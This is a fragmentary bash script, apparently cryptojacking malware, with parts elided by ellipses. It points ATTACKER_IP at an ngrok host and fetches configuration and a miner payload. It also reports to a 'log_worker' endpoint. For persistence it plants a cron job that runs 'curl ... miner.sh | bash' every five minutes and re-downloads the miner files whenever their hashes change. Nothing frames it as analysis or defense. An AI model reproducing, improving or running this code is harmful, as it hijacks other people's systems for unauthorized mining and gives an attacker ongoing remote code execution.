...
# Default Configuration - Updated to use the public Ngrok URL.
ATTACKER_IP="enough-pup-hopefully.ngrok-free.app"
ATTACKER_PORT="80" # Standard HTTP port, will be omitted in URL construction
CONFIG_URL="https://github.com/lifewithoutcodes/mining-scripts/releases/latest/download/config.txt"
LOG_URL="http://${ATTACKER_IP}/log_worker"
    ...
    if [ -f /tmp/config.txt ]; then
        while IFS= read -r line; do
            if [[ $line =~ ^CONFIG_UPDATE_URL=(.*)$ ]]; then
                ...
                LOG_URL="http://${ATTACKER_IP}/log_worker" # Port removed for standard HTTP
            fi
        done < /tmp/config.txt
    else
...
run_miner() {
    MINER_URL="http://$ATTACKER_IP/miner.js" # Port removed for standard HTTP
...
ensure_persistence() {
    CRON_JOB="*/5 * * * * curl -s http://$ATTACKER_IP/miner.sh | bash" # Port removed for standard HTTP
    ...
    for file in /tmp/miner.sh /tmp/miner.js; do
        if [ -f "$file" ]; then
            ...
            EXPECTED_HASH=$(curl -s "http://$ATTACKER_IP/${file##*/}" | sha256sum | awk '{print $1}') # Port removed
            if [ "$CURRENT_HASH" != "$EXPECTED_HASH" ]; then
                curl -s "http://$ATTACKER_IP/${file##*/}" -o "$file" # Port removed
